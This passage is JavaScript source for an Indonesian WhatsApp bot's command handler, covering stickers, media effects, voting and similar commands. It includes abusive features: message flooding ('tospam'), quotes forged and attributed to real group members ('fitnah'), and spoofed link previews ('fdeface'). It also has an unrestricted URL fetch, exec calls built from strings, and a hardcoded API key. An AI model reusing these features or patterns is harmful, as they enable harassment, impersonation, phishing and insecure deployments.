                if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (!q) return setReply(`Kirim perintah *${prefix}foliokiri* teks`)
                setReply(mess.wait)
                const splitText = q.replace(/(\S+\s*){1,13}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 10).join('\n')
                spawn('convert', [
                    './temp/nulis/images/folio/sebelumkiri.jpg',
                    '-font',
'./temp/nulis/font/Indie-Flower.ttf',
                    '-size',
'3200x2180',
                     '-pointsize',
'55',
                     '-interline-spacing',
'2',
                     '-annotate',
'+80+390',
                    fixHeight,
'./temp/nulis/images/folio/setelahkiri.jpg'
                ])
                .on('error', () => setReply("Error Bjeer, Keknya Scriptnya Lagi Error"))
                .on('exit', () => {
                    xdev.sendMessage(from, fs.readFileSync('./temp/nulis/images/folio/setelahkiri.jpg'), image, {quoted: dev, caption: `Nih...`})
                    limitAdd(senderNumber, user)
                })
            }
                break
                
            case 'foliokanan':{
                if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (!q) return setReply(`Kirim perintah *${prefix}foliokanan* teks`)
                setReply(mess.wait)
                const splitText = q.replace(/(\S+\s*){1,13}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 10).join('\n')
                spawn('convert', [
                    './temp/nulis/images/folio/sebelumkanan.jpg',
                    '-font',
'./temp/nulis/font/Indie-Flower.ttf',
                    '-size',
'3200x2180',
                    '-pointsize',
'55',
                    '-interline-spacing',
'2',
                    '-annotate',
'+130+400',
                    fixHeight,
'./temp/nulis/images/folio/setelahkanan.jpg'
                ])
                .on('error', () => setReply("Error Bjeer, Keknya Scriptnya Lagi Error"))
                .on('exit', () => {
                    xdev.sendMessage(from, fs.readFileSync('./temp/nulis/images/folio/setelahkanan.jpg'), image, {quoted: dev, caption: `Nih...`})
                    limitAdd(senderNumber, user)
                })
            }
                break
                
                
                
                
                
                
                
                
                
                
                

       
            
          case 'getfp':
         case 'getpp':
				if (isGroup) { 
				if(q) return setReply("Jangan di tag")
				 if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return setReply("Reply Targetnya")
				setReply(mess.wait)
			     kicknya = dev.message.extendedTextMessage.contextInfo.participant
			     try {
                 pic = await xdev.getProfilePicture(kicknya)
                 } catch {
                pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
                }
                onichan = await getBuffer(pic)
				xdev.sendMessage(from, onichan, image, {quoted: setQuoted})
                } else {
                setReply(mess.wait)
                linkpp = await xdev.getProfilePicture(from) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
                buffer = await getBuffer(linkpp)
               xdev.sendMessage(from, buffer, image, {caption: "Nih", quoted: dev })
               }     
               break
            
            
            
               
            case 'getbio':
            if(isGroup){
         if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return setReply("Reply Targetnya")
	  setReply(mess.wait)
	  var yy = dev.message.extendedTextMessage.contextInfo.participant
var p = await xdev.getStatus(`${yy}`, MessageType.text)
setReply(p.status)
} else{
setReply(mess.wait)
var a = await xdev.getStatus(from, MessageType.text)
setReply(a.status)
}
break
           
           
           
           
           


           
           

           
           
case 'tospam':
if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return setReply('Reply targetnya!')
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return setReply('Kebanyakan!')
if (!Number(oi2)) return setReply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  xdev.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = dev.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return setReply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return setReply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  xdev.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await xdev.downloadAndSaveMediaMessage(encmedian)
				ara = fs.readFileSync(median)
	if (!Number(args[0])) return setReply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return setReply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  sendSticker(ara)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await xdev.downloadAndSaveMediaMessage(encmediat)
				ara = fs.readFileSync(mediat)
	if (!Number(args[0])) return setReply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return setReply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  xdev.sendMessage(from, ara, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
	delb = await xdev.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return setReply('Kebanyakan!')
	if (!Number(oi2)) return setReply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  xdev.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
           
           
           
           
           
           
           
           
           
           
           
    case 'delvote':
            if(!dev.key.remoteJid) return
            if(isVote) return setReply('Tidak ada sesi Voting')
            delVote(from)
            setReply('Sukses Menghapus sesi Voting Di Grup Ini')
            break
    case 'voting':
            if(!isGroupAdmins && !dev.key.fromMe) return 
            if(!isGroup) return setReply(mess.only.group)
            if(!q) return setReply('*Voting*\n\n'+ prefix+ 'voting @tag target | reason  | 1 (1 = 1 Menit)')
            if (isVote) return setReply('Sesi Voting Sedang Berlangsung Di Grup Ini')            
            if (dev.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || dev.message.extendedTextMessage.contextInfo == null) {
            let id = dev.message.extendedTextMessage.contextInfo.mentionedJid[0]
            split = args.join(' ').replace('@', '').split('|')
            if(!Number(split[2])) return setReply('masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit')
            await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai' +'\n\n' + `ketik vote untuk setuju \nketik devote untuk tidak setuju\n-Huruf kecil semua\n\nvote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,[id],true)
            addVote(from,split[1],split[0],split[2],reply)
            }
            break
            
            

    
    
    
    
    
    
    
    case 'caripesan':
            if(!q)return setReply('pesannya apa bang?')
            let v = await xdev.searchMessages(q,from,10,1)
            let s = v.messages
            let el = s.filter(v => v.message)
            el.shift()
            try {
            if(el[0].message.conversation == undefined) return
            setReply(`Ditemukan ${el.length} pesan`)
            await sleep(3000)
            for(let i = 0; i < el.length; i++) {
            await xdev.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
            }
            } catch(e){
            setReply('Pesan tidak ditemukan!')
            }           
            break
            

    
    case 'on': 
             if (!isOwner) return onlyOwner()
            offline = false
            setReply(' ANDA TELAH ONLINE')
            break       
    case 'statuson':
            setReply(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${publik ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
            break
    case 'off':
            if (!isOwner) return onlyOwner()
            if(!q) return reply ("Alasanya apa kak ?")
            if (!dev.key.fromMe && !isOwner) return 
            offline = true
            waktu = Date.now()
            anuu = q ? q : '-'
            alasan = anuu
            setReply(`Anda telah offline dengan alasan ${q}`)
            break   
    case 'get':
            if(!q) return setReply('linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            setReply(bu)
            })   
            break
     



case 'google':
              if (!q) return setReply('masukan teks')
              if(q == undefined || q == ' ') return setReply(`*Hasil Pencarian : ${q}* tidak ditemukan`)
               ggs = require('google-it')
              ggs({ 'query': q }).then(results => {
              vars =``
              vars += `_*Hasil Pencarian : ${q}*_\n`
              for (let i = 0; i < results.length; i++) {
              vars +=  `\n═════════════════\n\n*Judul:* ${results[i].title}\n\n*Deskripsi:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
}
var lama = vars.trim()
               xdev.sendMessage(from, lama, text, {quoted : dev })
               })
               break


					
					
					case 'setnamebot':
					case 'setbotname':
					if (!isOwner) return onlyOwner()
					setReply(`Berhasil mengubah nama bot ke ${q}`)
					fake = `${q}`
					break
					
					case 'forwardtotal':
					case 'totalforward':
					if(forwarding === false) return setReply("Aktifkan fitur forward")
					if (!isOwner) return onlyOwner()
					if(!q) return setReply(`Jumlah forwardnya berapa kak\ncontoh : 1, 100, 1000, 100000`)
					setReply(`Berhasil mengubah total forward ke ${q}`)
					totalForward = `${q}`
					break
					
					
					
					



			       
		     





                    
                


     





    case 'kontag':
        if(!q) return setReply(`penggunaan ${prefix}kontak nomor| nama`)
            if (!dev.key.fromMe && !isOwner && !isGroupAdmins) return setReply(mess.only.admin)
            pe = args.join('')
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return setReply('Invalid phone number');
            members_ids = []
            for (let mem of groupMembers) {
            members_ids.push(mem.jid)
            }
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${PhoneNumber('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            xdev.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
    
    case 'fitnah':
    try{
    if(!isGroup) return setReply("Hanya bisa di group tod")
    if(!q) return setReply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
           // if (args.length < 2) return setReply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            var gh = args.join(" ")
            mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
            xdev.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            } catch (err){
            	setReply(`Error ngab, penggunaan :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            }
            break
    
         
   
    case 'tomp3':
            if (isQuotedVideo) {
            setReply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp3')
            exec(`ffmpeg -i ${media} -vn ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return setReply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            } else {
            setReply("Reply videonya")
            }
            break
            
            

    
    case 'fast':
            if (isQuotedVideo) {
            setReply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return setReply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            } else {
            setReply('Reply videonya!')
            }
            break
            
    case 'slow':  
            if (isQuotedVideo){ 
            setReply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return setReply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            } else {
            setReply('Reply videonya!')
            }
            break
            
            case 'hode':
  if(isQuotedAudio) { 
            setReply(mess.wait)
					encmedia5 = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
					medok = await xdev.downloadAndSaveMediaMessage(encmedia5)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${medok} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(medok)
						if (err) return setReply('Error!')
						buffer453 = fs.readFileSync(ran)
						xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt: true, quoted: dev})
						fs.unlinkSync(ran)
					})
					} else {
					setReply('Reply audionya')
					}
				break
            
            case 'ghost':
if(isQuotedAudio) { 
            setReply(mess.wait)
					encmedia2 = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
					mele = await xdev.downloadAndSaveMediaMessage(encmedia2)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mele} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(mele)
					if (err) return setReply('Error!')
					buffer453 = fs.readFileSync(ran)
					xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt:true, quoted : dev})
                    fs.unlinkSync(ran)
				    }) 
} else {
				setReply('Reply audionya')
				}
		            break



case 'nightcore':
if(isQuotedAudio) { 
setReply(mess.wait)
					encmedia4 = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
					mela = await xdev.downloadAndSaveMediaMessage(encmedia4)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mela} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mela)
						if (err) return setReply('Error!')
						buffer453 = fs.readFileSync(ran)
						xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt:true, quoted : dev})
						fs.unlinkSync(ran)
					   })
					} else {
						setReply('Reply audionya')
						}
				       break



case 'tupai':
if(isQuotedAudio) { 
				setReply(mess.wait)
					mesi = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
					medoi = await xdev.downloadAndSaveMediaMessage(mesi)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${medoi} -filter:a "atempo=0.8,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(medoi)
						if (err) return setReply('Error!')
						buffer453 = fs.readFileSync(ran)
						xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt:true, quoted : dev})
						fs.unlinkSync(ran)
					})
} else {
						setReply('Reply audionya')
						}
				break





case 'imut':
if(isQuotedAudio) { 
setReply(mess.wait)
	 ahu = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
	masa = await xdev.downloadAndSaveMediaMessage(ahu)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${masa} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(masa)
if (err) return setReply('Error!')
buffer453 = fs.readFileSync(ran)
xdev.sendMessage(from, buffer453, audio, { mimetype: "audio/mp4", ptt: true, quoted: dev})
fs.unlinkSync(ran)
})
} else {
	setReply('Reply audionya')
	}
break

       
       
      
        case 'listrespon':{
          let txt = `List Respon\nTotal : ${commandsDB.length}\n\n`
          for (let i = 0; i < commandsDB.length; i++){
          txt += `❏ Key : ${commandsDB[i].pesan}\n`
          }
          setReply(txt)
          }
        break
        
        
    case 'reverse':
            if (!isQuotedVideo) return setReply('Reply videonya!')
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return setReply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
            
    
       case 'sourcecode': 
       case 'sc': 
       case 'src':
              xdev.sendMessage(from, `Bot ini menggunakan sc dari youtube https://youtu.be/dZRGjP-YcLU`, text, {quoted : dev, detecLinks : true})
              break

case 'style':
				  if(!q) return setReply('Masukkan teks!')
         setReply(mess.wait)
			axios.get(`https://kocakz.herokuapp.com/api/random/text/fancytext?text=${body.slice(7)}`).then((res) => {
      let hasil = `*Hasil* :\n${res.data.result}`;
      xdev.sendMessage(from, hasil, MessageType.text, { quoted: dev});
    })
break

case 'pastebin':
if(!q) return setReply(`Contoh ${prefix}pastebin Extream`)
yamete = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${q}`, {method: 'get'})
xdev.sendMessage(from, `${yamete.result}`, text, {quoted: setQuoted})
break
                     
     


                
    case 'anime':
     if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            setReply(mess.wait)
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'NIH'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
            
    case 'kontak':
    if(!q) return setReply(`penggunaan ${prefix}kontak nomor| nama`)
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return setReply('Invalid phone number');
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${PhoneNumber('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            xdev.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break    
            
case 'getname':
if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return setReply('Reply targetnya!')
if(isGroup) {
var ambl = dev.message.extendedTextMessage.contextInfo.participant
const sname = xdev.contacts[ambl] != undefined ? xdev.contacts[ambl].notify = undefined ? PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[ambl].notify || xdev.contacts[ambl].vname : PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international')
setReply(sname)
}else {
const yahu = xdev.contacts[from] != undefined ? xdev.contacts[from].notify = undefined ? PhoneNumber('+' + from.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[from].notify || xdev.contacts[from].vname : PhoneNumber('+' + from.replace('@s.whatsapp.net', '')).getNumber('international')
setReply(yahu)
}
break
            
            
    case 'take':
    case 'colong':
    		if (!isQuotedSticker) return setReply(`Reply stickernya denya ${prefix}take Wawan|suka makan`)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		    media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ahuh = args.join(' ').split('|')
            satu = ahuh[0] !== '' ? ahuh[0] : `EXTREAM`
            dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
            require('./lib/fetcher.js').createExif(satu, dua)
			require('./lib/fetcher.js').modStick(media, xdev, dev, from)
			break
			
	
    case 'fdeface':
            ge = args.join('')           
            var pe = ge.split("|")[0];
            var pen = ge.split("|")[1];
            var pn = ge.split("|")[2];
            var be = ge.split("|")[3];
            const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`
            if (args.length < 1) return reply (fde)
             dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
             tipes = await xdev.downloadAndSaveMediaMessage(dipes)        
             bufer = fs.readFileSync(tipes)
             desct = `${pn}`
             title = `${pen}`
             url = `${pe}`
             buu = `https://${be}`
    		var anus = {
        	detectLinks: false
    		}
    		var mat = await xdev.generateLinkPreview(url)
    		mat.title = title;
    		mat.description = desct;
    		mat.jpegThumbnail = bufer;
   			mat.canonicalUrl = buu; 
    		xdev.sendMessage(from, mat, MessageType.extendedText, anus)
           fs.unlinkSync(tipes)
            break

		
			
				
			        
				
				     
	
				case 'delerror':
				case 'delror':
					if (!dev.key.fromMe && !isOwner) return reply (mess.only.ownerB)
					try {
					 listerror.splice(q, 1)
					fs.writeFileSync('./database/listerror.json', JSON.stringify(listerror))
					await xdev.sendMessage(from, `Sukses menghapus ${q} di daftar error`, text)
					} catch (err){
						console.log(err)
						setReply('eror kak')
					}
					break
				
				
				
				
				
				
				
				
				case 'delvn':
					if (!isOwner) return onlyOwner() 
					try {
					 wanu = audionye.indexOf(q)
					 audionye.splice(wanu, 1)
					fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
				    fs.unlinkSync(`./temp/audio/${q}.mp3`)
					xdev.sendMessage(from, 'Sukses', text)
					} catch (err){
						console.log(err)
						setReply('eror kak')
					}
					break
					
					
					
				case 'restart':
if (!isOwner && !dev.key.fromMe) return setReply("Khusus Owner")
await setReply(`Succes restarting`)
exec(`node main`)
break
	
			
				
				case 'liststik':
				teks = '*Sticker list :*\n\n'
				for (let awokwkwk of setiker) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${setiker.length}*`
				xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": setiker } })
				break
				
				
				
				case 'listvn':
			case 'vnlist':
				teks = '*List Vn:*\n\n'
				for (let awokwkwk of audionye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total ada : ${audionye.length}*`
				teks += `\n\n*Untuk mengambil vn silakan ketik nama vn*`
				xdev.sendMessage(from, teks.trim(), extendedText, { quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': thumb }}}, contextInfo: forward })
				break
				
				
				
				
				
				
				
		    



	



	
	    
    
    

case 'exif':
case 'setexif':
if (!isOwner && !dev.key.fromMe) return onlyOwner()
const exifff = `${args.join(' ')}`
const namaPack = exifff.split('|')[0]
const authorPack = exifff.split('|')[1]
exif.create(namaPack, authorPack)
await setReply('Done gan')
break


case 'sticker':
					case 'stiker':
					case 's':
						if (isMedia && !dev.message.videoMessage || isQuotedImage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
							const media = await xdev.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										setReply(`${err}`)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return setReply(mess.error.api)
											xdev.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: dev})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && dev.message.videoMessage.fileLength < 10000000 || isQuotedVideo && dev.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
							const media = await xdev.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							setReply(mess.wait)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										setReply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return setReply(error)
											xdev.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: dev})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						}  else {
							setReply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
						}
						break


case 'nobg':
if ((isMedia || isQuotedImage)) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
const media = await xdev.downloadAndSaveMediaMessage(encmedia)
ranw = getRandom('.webp')
ranp = getRandom('.png')
setReply(mess.wait)
keyrmbg = '9Gs2qT31Ensb4gEmxw5p28JA'
await removeBackgroundFromImageFile({ path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp }).then(res => {
fs.unlinkSync(media)
let bufferir9vn5 = Buffer.from(res.base64img, 'base64')
fs.writeFileSync(ranp, bufferir9vn5, (err) => {
if (err) return setReply('Gagal, Terjadi kesalahan, silahkan coba beberapa saat lagi.')
})
exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
fs.unlinkSync(ranp)
if (err) return setReply(`emror bang ${err}`)
xdev.sendMessage(from, fs.readFileSync(ranw), sticker, { quoted: dev })
fs.unlinkSync(ranw)
})
}) 
}
break



            case 'addcmd': 
			case 'setcmd':{
                  if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
                  if (isQuotedSticker) {
                  if (!q) return setReply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
                  var kodenya = dev.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
                   if (checkSCommand(kodenya, _scommand) === true) return setReply(`Command tersebut sudah ada`)
                  addCmd(kodenya, q)
                  setReply("_Success_")
                  } else {
                  setReply('tag stickenya')
                  }
                  }
            break
            
            
			
            case 'toptt':
             if (isQuotedAudio){
					setReply(mess.wait)
					encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await xdev.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return setReply('Gagal mengkonversi audio ke ptt')
						topt = fs.readFileSync(ran)
						 xdev.sendMessage(from, topt, audio, {mimetype: 'audio/mp4', quoted: dev, ptt:true})
						fs.unlinkSync(ran)
						})
						}
					break
            
   
            
            case 'delcmd':{
                  if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
                  if (!isQuotedSticker) return setReply(`Penggunaan : ${command} tagsticker`)
                  var kodenya = dev.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
                  if (checkSCommand(kodenya, _scommand) === false) return setReply(`Command tersebut tidak ada`)
                  _scommand.splice(getCommandPosition(kodenya), 1)
                  fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
                  setReply("_Success_")
                  }
            break
            case 'listcmd':
let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
let cemde = [];
for (let i of _scommand) {
cemde.push(i.id)
teksnyee += `\n\n*•> ID :* ${i.id}\n*•> Cmd* : ${i.chats}`
}
mentions(teksnyee, cemde, true)
break
    case 'toimg':
			if (!isQuotedSticker) return setReply('Reply stickernya')
			setReply(mess.wait)
